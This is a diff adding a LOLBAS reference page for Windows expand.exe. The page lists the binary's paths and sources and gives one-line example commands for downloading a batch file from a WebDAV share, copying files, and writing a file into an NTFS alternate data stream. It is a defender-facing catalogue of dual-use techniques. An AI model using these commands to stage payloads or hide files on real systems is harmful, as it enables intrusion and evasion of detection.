@@ -31,7 +31,125 @@
 </h1>
 
 
+<ul class="function-list">
+    
+    
+    <li><a href="/lolbas/Binaries/Expand/#download">Download</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Expand/#copy">Copy</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Expand/#ads">Alternate data streams</a></li>
+    
+</ul>
 
+<p>Expands one or more compressed files. You can use this command to retrieve compressed files from distribution disks.</p>
+
+<br>
+<p><b>Paths:</b> 
+	<ul style="list-style-type:none">
+	
+	<li>c:\windows\system32\expand.exe</li>
+	
+	<li>c:\windows\sysWOW64\expand.exe</li>
+	 
+	</ul>
+</p>
+<br>
+<b>Resources:</b> 	
+	<ul style="list-style-type:none">
+	
+	<li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/expand">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/expand</a></li>
+	
+	<li><a href="https://twitter.com/infosecn1nja/status/986628482858807297">https://twitter.com/infosecn1nja/status/986628482858807297</a></li>
+	
+	<li><a href="https://twitter.com/Oddvarmoe/status/986709068759949319">https://twitter.com/Oddvarmoe/status/986709068759949319</a></li>
+	 
+	</ul>
+<br>
+<b>Contributors:</b> 
+
+<br>
+
+
+
+
+
+
+<h2 id="download" class="function-name">Download</h2>
+
+<p>The LOLBAS can download files.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Copies source file to destination.</p>
+
+        <pre><code>expand \\webdav\folder\file.bat c:\ADS\file.bat</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
+
+
+
+
+<h2 id="copy" class="function-name">Copy</h2>
+
+<p>The LOLBAS can copy file.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Copies source file to destination.</p>
+
+        <pre><code>expand c:\ADS\file1.bat c:\ADS\file2.bat</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
+
+
+
+
+<h2 id="ads" class="function-name">Alternate data streams</h2>
+
+<p>The LOLBAS can write or read alternate data streams.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Copies source file to destination Alternate Data Stream (ADS).</p>
+
+        <pre><code>expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
 
 
 
